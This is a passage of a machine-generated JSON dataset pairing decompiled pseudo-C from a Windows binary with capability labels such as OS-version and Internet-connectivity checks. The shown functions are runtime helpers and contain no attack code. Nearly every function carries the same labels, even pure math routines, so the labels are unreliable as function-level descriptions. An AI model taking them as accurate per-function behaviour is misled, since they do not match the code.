        "decompiled_code": "\nvoid __cdecl fcn.0042b3a4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x42b3c1;\n        in_EAX = fcn.00404964();\n    }\n    uStack60 = 0x42b44e;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.00405504();\n    fcn.0040d25c();\n    arg_8h_00 = 0;\n    fcn.004075f4();\n    fcn.0040af90(arg_8h_00);\n    fcn.0040dbfc(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x42b455;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 309
    },
    "0042c0e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c0e0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42c1a5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.004056f4();\n        arg_10h = 0;\n        fcn.004056f4();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.004056f4();\n        iStack64 = fcn.0042b478(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.00406104();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.0042b3a4(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.00405460();\n        }\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x493014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x42c1ac;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 542
    },
    "0042c40c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042c40c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42c482;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497a58 = *0x497a58 + 1;\n    if (*0x497a58 == 0) {\n        *0x497a5c = 1;\n        fcn.00404640();\n        **0x4929c0 = 0;\n        **0x492640 = 0;\n        **0x492964 = 0;\n        if (*0x497a68 != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.00406018();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 217
    },
    "0042c4d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0042c4d4(float10 param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    float10 fVar3;\n    \n    fVar3 = 1;\n    uVar2 = (in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f);\n    if (uVar2 != 0) {\n        while( true ) {\n            uVar1 = uVar2 & 1;\n            uVar2 = uVar2 >> 1;\n            if ((uVar1 != 0) && (fVar3 = fVar3 * param_1,  uVar2 == 0)) break;\n            param_1 = param_1 * param_1;\n        }\n        if (in_EAX < 0) {\n            fVar3 = 1 / fVar3;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 215
    },
    "0042c504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0042c504(float param_1, float param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    float10 fVar4;\n    float10 fVar5;\n    uint var_4h;\n    \n    fVar4 = param_1;\n    if ((*0x490ea8 < ABS(fVar4)) || (ROUND(fVar4) != fVar4)) {\n        fVar5 = param_2;\n        if (fVar5 != 0) {\n            fVar5 = 1.442695040888963 * fVar4 * 0.6931471805599453 * fVar5;\n            fVar4 = ROUND(fVar5);\n            fVar5 = f2xm1(fVar5 - fVar4);\n            fVar5 = fscale(1 + fVar5, fVar4);\n        }\n    }\n    else {\n        uVar1 = ROUND(fVar4);\n        fVar5 = 1;\n        uVar3 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f);\n        if (uVar3 != 0) {\n            fVar4 = param_2;\n            while( true ) {\n                uVar2 = uVar3 & 1;\n                uVar3 = uVar3 >> 1;\n                if ((uVar2 != 0) && (fVar5 = fVar5 * fVar4,  uVar3 == 0)) break;\n                fVar4 = fVar4 * fVar4;\n            }\n            if (uVar1 < 0) {\n                fVar5 = 1 / fVar5;\n            }\n        }\n    }\n    return fVar5;\n}\n",
        "token_count": 392
    },
    "0042d818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042d8f7)\n\nvoid __fastcall fcn.0042d818(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x42d935;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        puStack56 = 0x42d856;\n        fcn.004054c0();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    if (-1 < *(*(in_EAX + 0x10) + 8) + -1) {\n        puStack56 = 0x42d881;\n        fcn.004197d8();\n        puStack56 = 0x42d88c;\n        fcn.00407110();\n        uStack60 = 0x42d904;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        fcn.004070f8();\n        cVar2 = fcn.0040f8c8();\n        if (cVar2 != '\\0') {\n            (**(_pe_dos_header + 0x40))();\n            (**(_pe_dos_header + 0x44))();\n        }\n        iVar3 = (**(_pe_dos_header + 0x10))();\n        if (iVar3 < 1) {\n            *in_FS_OFFSET = uStack52;\n            return;\n        }\n        puStack56 = 0x42d8e2;\n        fcn.00404f60();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x42d93c;\n    uStack48 = 0x42d92c;\n    fcn.004070f8();\n    uStack48 = 0x42d934;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 574
    },
    "0042d044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042d044(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY112;\n    uint uStackY108;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint in_stack_ffffffa0;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x42d2db;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        puStack80 = 0x42d07c;\n        fcn.004054c0();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    if (0 < *(*(var_8h + 0x10) + 8)) {\n        puStack80 = 0x42d098;\n        var_20h = fcn.00404610();\n        uStack84 = 0x42d2b6;\n        uStack88 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa8;\n        iVar2 = *(*(var_8h + 0x10) + 8);\n        puStack80 = &stack0xfffffffc;\n        if (-1 < iVar2 + -1) {\n            var_10h = 0;\n            puStack80 = &stack0xfffffffc;\n            var_24h = iVar2;\n            do {\n                iVar2 = fcn.004197d8();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    fcn.00419680();\n                }\n                var_10h = var_10h + 1;\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*(var_20h + 8) == 0) {\n            var_2ch = fcn.004058fc();\n            var_28h._0_1_ = 6;\n            in_stack_ffffffa0 = 0;\n            uStackY100 = 0x42d123;\n            fcn.0040db68(0, &fcn.0042d044::var_2ch);\n            uStackY100 = 0x42d128;\n            fcn.00404eb4();\n        }\n        else {\n            if (*(var_20h + 8) != 1) {\n                var_18h = fcn.00404610();\n                uStackY100 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff9c;\n                if (-1 < *(var_20h + 8) + -1) {\n                    var_10h = 0;\n                    var_24h = *(var_20h + 8);\n                    do {\n                        puStackY104 = 0x42d18c;\n                        iVar2 = fcn.004197d8();\n                        puStackY104 = 0x42d199;\n                        var_1ch = (**(**(iVar2 + 4) + 0x14))();\n                        if (var_1ch != NULL) {\n                            uStackY108 = 0x42d1fe;\n                            uStackY112 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffff90;\n                            puStackY104 = &stack0xfffffffc;\n                            iVar2 = (**(*var_1ch + 0x14))();\n                            if (-1 < iVar2 + -1) {\n                                var_14h = 0;\n                                do {\n                                    (**(*var_1ch + 0xc))();\n                                    (**(*var_18h + 0x3c))();\n                                    var_14h = var_14h + 1;\n                                    iVar2 = iVar2 + -1;\n                                } while (iVar2 != 0);\n                            }\n                            *in_FS_OFFSET = uStackY112;\n                            puStackY104 = 0x42d205;\n                            uStackY108 = 0x42d1fd;\n                            fcn.00404640();\n                            return;\n                        }\n                        var_10h = var_10h + 1;\n                        var_24h = var_24h + -1;\n                    } while (var_24h != 0);\n                }\n                if (*(var_8h + 0xc) == 0) {\n                    puStackY104 = 0x42d269;\n                    iVar2 = (**(*var_18h + 0x18))();\n                    puStackY104 = 0x42d278;\n                    (**(*var_18h + 0xc))();\n                    puStackY104 = 0x42d283;\n                    (**(**(iVar2 + 4) + 0x20))();\n                }\n                else {\n                    puStackY104 = 0x42d225;\n                    (**(*var_18h + 0x90))();\n                    puStackY104 = 0x42d233;\n                    iVar2 = (**(**(var_8h + 0xc) + 0xc))();\n                    if (-1 < iVar2) {\n                        puStackY104 = 0x42d243;\n                        iVar2 = (**(*var_18h + 0x18))();\n                        puStackY104 = 0x42d252;\n                        (**(*var_18h + 0xc))();\n                        puStackY104 = 0x42d25d;\n                        (**(**(iVar2 + 4) + 0x20))();\n                    }\n                }\n                *in_FS_OFFSET = uStackY100;\n                fcn.00404640();\n                return;\n            }\n            iVar2 = fcn.004197d8();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        uStack88 = 0x42d2bd;\n        fcn.00404640();\n        return;\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x42d2e2;\n    uStack72 = 0x42d2d2;\n    fcn.0040546c();\n    uStack72 = 0x42d2da;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1601
    },
    "0042d380": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042d49e)\n// WARNING: Removing unreachable block (ram,0x0042d4c9)\n// WARNING: Removing unreachable block (ram,0x0042d4cc)\n// WARNING: Removing unreachable block (ram,0x0042d50c)\n// WARNING: Removing unreachable block (ram,0x0042d528)\n// WARNING: Removing unreachable block (ram,0x0042d52c)\n// WARNING: Removing unreachable block (ram,0x0042d572)\n// WARNING: Removing unreachable block (ram,0x0042d53b)\n// WARNING: Removing unreachable block (ram,0x0042d57f)\n\nvoid __fastcall fcn.0042d380(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x42d5f9;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.004054c0();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040db2c();\n        fcn.00404eb4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.004197d8();\n            fcn.00407110();\n            fcn.0040713c();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040db2c();\n        fcn.00404eb4();\n    }\n    if (var_1ch == 1) {\n        fcn.0042d2ec(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0042d2ec(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040713c();\n        fcn.0042d2ec(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x42d600;\n    uStack76 = 0x42d5cd;\n    fcn.004070f8();\n    uStack76 = 0x42d5d5;\n    fcn.0040546c();\n    uStack76 = 0x42d5e8;\n    fcn.00406018();\n    uStack76 = 0x42d5f0;\n    fcn.004070f8();\n    uStack76 = 0x42d5f8;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 848
    },
    "0042d630": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d630(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42d6ef;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.004054c0();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040db2c();\n        fcn.00404eb4();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.004197d8();\n            fcn.00407110();\n            fcn.0040713c();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42d6f6;\n    uStack36 = 0x42d6e6;\n    fcn.004070f8();\n    uStack36 = 0x42d6ee;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 437
    },
    "0042d75c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d75c(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42d775;\n    fcn.004058ec();\n    uStack28 = 0x42d806;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0042d380();\n    }\n    else if (iVar1 == 2) {\n        fcn.0042cde8();\n    }\n    else if (iVar1 == 3) {\n        fcn.0042ce18();\n    }\n    else if (iVar1 == 8) {\n        fcn.0042d380();\n    }\n    else {\n        fcn.0042cf7c(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x42d80d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 349
    },
    "0042cb8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042cb8c(void)\n\n{\n    if (*0x497a70 == 0) {\n        fcn.0042cc3c();\n        fcn.00407110();\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "0042cbb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0042cbb8(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0042cb8c();\n    uVar1 = fcn.0040713c();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 97
    },
    "0042ce18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ce18(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42cf6d;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x42ce45;\n    piVar3 = fcn.00404610();\n    uStack52 = 0x42cf22;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(in_EAX + 0x10) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            iVar4 = fcn.004197d8();\n            cVar2 = (**(**(iVar4 + 4) + 0x18))();\n            if (cVar2 != '\\0') {\n                (**(**(iVar4 + 4) + 0xc))();\n                (**(*piVar3 + 0x3c))();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    iVar5 = (**(*piVar3 + 0x14))();\n    if (iVar5 == 1) {\n        iVar5 = (**(*piVar3 + 0x18))();\n        (**(**(iVar5 + 4) + 0x1c))();\n    }\n    else {\n        iVar5 = (**(*piVar3 + 0x14))();\n        if ((0 < iVar5) && (*(in_EAX + 0xc) != 0)) {\n            (**(*piVar3 + 0x90))();\n            (**(**(in_EAX + 0xc) + 0x10))();\n            (**(*piVar3 + 0x18))();\n            fcn.00407110();\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x42cf29;\n    uStack52 = 0x42cf21;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 620
    },
    "0042cf7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cf7c(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d020;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        fcn.004054c0();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.004197d8();\n            fcn.004070f8(*(iVar3 + 4));\n            cVar2 = fcn.0040f8c8();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))(arg_8h, arg_ch);\n                break;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42d027;\n    uStack40 = 0x42d01f;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 392
    },
    "0042da1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042da1c(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42da32;\n    fcn.004058ec();\n    uStack28 = 0x42dad9;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x497a9c) == '\\0') {\n        if (*0x497a98 == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x497aa4 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x497a84 = fcn.0042da1c(),  *0x497aa4 == '\\0')) {\n                fcn.0040546c();\n            }\n            uVar1 = fcn.004058fc();\n            in_stack_ffffffd8 = *0x497a98;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x497a98, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x497aa4 = '\\x01';\n        }\n        *(in_AL + 0x497a9c) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42dae0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 440
    },
    "0042db00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042db00(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x497a9c == '\\0') {\n        *0x497a74 = fcn.0042da1c();\n        (**0x497a74)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0042db88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
